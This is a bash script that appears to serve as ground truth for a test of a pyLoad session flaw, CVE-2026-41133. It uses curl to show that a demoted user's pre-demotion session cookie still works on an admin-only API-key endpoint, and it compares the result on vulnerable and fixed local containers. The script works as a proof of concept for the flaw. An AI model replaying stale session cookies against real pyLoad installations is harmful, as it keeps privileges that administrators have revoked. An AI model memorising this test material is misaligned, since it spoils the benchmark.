#!/usr/bin/env bash
# Ground truth for Tier-2b (pyLoad CVE-2026-41133), by hand, over HTTP only.
#
# Runs the MR-A1 triple against both variants and prints the three statuses. Expected:
#
#   VULNERABLE (:8090)  200 / 200 / 200   <- the bug: alice keeps admin power after demotion
#   FIXED      (:8091)  200 / 200 / 403   <- control: the stale session is re-checked
#
# The crux is that step 4 REPLAYS alice's pre-transition session cookie. Logging in again
# would hand back a cookie for the demoted alice and hide the bug entirely.
set -u

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

triple () {
    local port=$1 label=$2
    local aj="$TMP/alice-$port.jar" sj="$TMP/super-$port.jar"

    # Reseed so alice starts as ADMIN regardless of a previous run.
    docker exec "$3" python /seed_users.py /data/data/pyload.db >/dev/null 2>&1

    # 1. alice logs in WHILE STILL ADMIN. This cookie is the credential under test.
    curl -s -o /dev/null -c "$aj" -X POST \
        -d "username=alice&password=alicepass" "http://localhost:$port/login"

    # 2. SOURCE: an admin-only, non-consuming write. Must be ALLOWED (2xx) for the
    #    guard in the relation to hold -- it proves the action needs the privilege.
    local s1
    s1=$(curl -s -o /dev/null -w "%{http_code}" -b "$aj" -X POST \
        -H "Content-Type: application/json" \
        -d '{"user":"alice","password":"alicepass","name":"before","expires":null}' \
        "http://localhost:$port/json/generate_apikey")

    # 3. TRANSITION: superadmin demotes alice. Marking every OTHER admin keeps them
    #    admin, so alice is the only account whose role is reduced.
    curl -s -o /dev/null -c "$sj" -X POST \
        -d "username=superadmin&password=superpass" "http://localhost:$port/login"
    local s2
    s2=$(curl -s -o /dev/null -w "%{http_code}" -b "$sj" -X POST \
        -H "Content-Type: application/json" \
        -d '{"update_data": {"superadmin|admin": true, "pyload|admin": true}}' \
        "http://localhost:$port/json/update_users")

    # 3b. Confirm the demotion actually took effect, so a PASS cannot be a silent no-op.
    local role
    role=$(docker exec "$3" python -c "
import sqlite3
c = sqlite3.connect('/data/data/pyload.db').cursor()
c.execute('SELECT role FROM users WHERE name=?', ('alice',))
print(c.fetchone()[0])" 2>/dev/null)

    # 4. FOLLOW-UP: the SAME action, the SAME cookie, no re-login.
    local s3
    s3=$(curl -s -o /dev/null -w "%{http_code}" -b "$aj" -X POST \
        -H "Content-Type: application/json" \
        -d '{"user":"alice","password":"alicepass","name":"after","expires":null}' \
        "http://localhost:$port/json/generate_apikey")

    printf '%-22s %s / %s / %s   (alice role after transition: %s)\n' \
        "$label" "$s1" "$s2" "$s3" "$role"
}

echo "                       source / transition / follow-up"
triple 8090 "VULNERABLE (:8090)" pyload-vuln
triple 8091 "FIXED      (:8091)" pyload-fixed
echo
echo "expected: VULNERABLE 200/200/200 (bug)   FIXED 200/200/403 (control)"
echo "alice role must be 1 (USER) in both, or the transition did not take effect."
